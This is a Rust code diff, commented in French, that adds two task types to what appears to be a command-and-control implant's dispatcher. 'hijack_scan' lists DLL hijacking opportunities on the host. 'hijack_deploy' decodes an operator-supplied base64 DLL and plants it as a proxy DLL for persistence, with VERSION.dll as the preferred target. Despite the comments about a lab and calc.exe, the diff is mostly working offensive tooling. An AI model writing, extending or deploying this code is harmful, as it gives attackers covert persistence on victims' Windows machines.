@@ -20,6 +20,8 @@ pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
         "envdump"    => dump_env(),
         "cd"         => change_directory(payload),
         "pwd"        => print_directory(),
+        "hijack_scan" => hijack_scan(),
+        "hijack_deploy" => hijack_deploy(payload),
         _            => (
             String::new(),
             format!("Unknown task type: {}", task.task_type),
@@ -197,5 +199,60 @@ fn print_directory() -> (String, String, bool) {
     match std::env::current_dir() {
         Ok(path) => (format!("{}", path.display()), String::new(), true),
         Err(e) => (String::new(), e.to_string(), false),
+    }
+}
+
+/// hijack_scan — cherche des opportunités de DLL hijacking
+fn hijack_scan() -> (String, String, bool) {
+    let targets = crate::inject::dll_hijack::find_hijack_opportunities();
+    if targets.is_empty() {
+        return ("Aucune opportunité de DLL hijacking trouvée sur ce système.".into(), String::new(), true);
+    }
+
+    let mut output = String::from("Opportunités de DLL Hijacking trouvées :\n");
+    for (i, t) in targets.iter().enumerate() {
+        output.push_str(&format!(
+            "[{}] Application : {:?}\n    DLL Manquante : {}\n    Drop Path : {:?}\n",
+            i, t.app_path, t.dll_name, t.drop_path
+        ));
+    }
+    
+    (output, String::new(), true)
+}
+
+/// hijack_deploy — déploie une DLL proxy pour le hijacking
+///
+/// payload attendu : base64_dll_bytes
+fn hijack_deploy(payload: &str) -> (String, String, bool) {
+    if payload.is_empty() {
+        return (String::new(), "usage: hijack_deploy <base64_dll_bytes>".into(), false);
+    }
+
+    // Décoder la DLL depuis le base64
+    let dll_bytes = match base64::Engine::decode(
+        &base64::engine::general_purpose::STANDARD,
+        payload,
+    ) {
+        Ok(bytes) => bytes,
+        Err(e) => return (String::new(), format!("Erreur décodage base64 : {}", e), false),
+    };
+
+    // Pour le lab, on va cibler calc.exe -> VERSION.dll par défaut si on trouve la cible
+    let targets = crate::inject::dll_hijack::find_hijack_opportunities();
+    
+    // On cherche une cible valide (de préférence calc.exe pour le lab)
+    let target = targets.into_iter().find(|t| t.dll_name.to_lowercase() == "version.dll")
+        .or_else(|| {
+             // Si pas de calc.exe, on prend la première cible dispo si elle existe
+             crate::inject::dll_hijack::find_hijack_opportunities().into_iter().next()
+        });
+
+    if let Some(target) = target {
+        match crate::inject::dll_hijack::persistence_via_hijack(&target, &dll_bytes) {
+            Ok(msg) => (msg, String::new(), true),
+            Err(e) => (String::new(), e, false),
+        }
+    } else {
+        (String::new(), "Aucune cible de hijacking trouvée pour déployer la DLL.".into(), false)
     }
 }
